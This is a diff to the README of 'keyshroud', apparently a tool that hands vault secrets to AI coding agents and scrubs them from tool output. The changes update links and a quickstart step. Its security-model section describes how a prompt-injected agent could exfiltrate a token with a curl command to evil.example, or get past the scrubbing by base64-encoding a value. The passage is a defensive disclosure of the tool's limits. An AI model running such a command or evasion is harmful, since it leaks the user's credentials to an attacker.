@@ -17,7 +17,7 @@ self-hosted [Vaultwarden](https://github.com/dani-garcia/vaultwarden) (or Bitwar
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Node](https://img.shields.io/node/v/keyshroud.svg)](package.json)
 
-[Quickstart](#quickstart) · [How it works](#how-it-works) · [Claude Code](#claude-code) · [pi / omp](#pi--omp) · [MCP](#any-mcp-client-codex-cursor-claude-desktop) · [Security model](#security-model) · [Comparison](docs/competitors.md)
+[Quickstart](#quickstart) · [How it works](#how-it-works) · [Claude Code](#claude-code) · [pi / omp](#pi--omp) · [MCP](#any-mcp-client-codex-cursor-claude-desktop) · [Security model](#security-model)
 
 </div>
 
@@ -65,8 +65,9 @@ scrubs every value from tool output before the model sees it.
 ## Quickstart
 
 **Requirements:** Node.js ≥ 22.18, the Bitwarden CLI (`npm i -g @bitwarden/cli`),
-and a Vaultwarden or Bitwarden account. No server yet? See
-[docs/self-hosting.md](docs/self-hosting.md) — it's one `docker compose up`.
+and a Vaultwarden or Bitwarden account. No server yet?
+[examples/vaultwarden](examples/vaultwarden) runs Vaultwarden behind Caddy
+(automatic HTTPS) with one `docker compose up -d`.
 
 ```bash
 npm install -g keyshroud
@@ -273,8 +274,8 @@ a command printed them.
 It does **not** make a hostile or prompt-injected agent safe. An agent that can
 run `keyshroud run -- curl https://evil.example -d "$TOKEN"`, or base64-encode a
 value before printing it, can exfiltrate it. If that is your threat model, use
-an egress proxy that swaps placeholder credentials on the wire (see
-[docs/competitors.md](docs/competitors.md)), restrict which secrets each session
+an egress proxy that swaps placeholder credentials on the wire (for example
+Infisical Agent Vault or OneCLI), restrict which secrets each session
 gets with `--only`, and keep a human approving commands.
 
 Guarantees we test for:
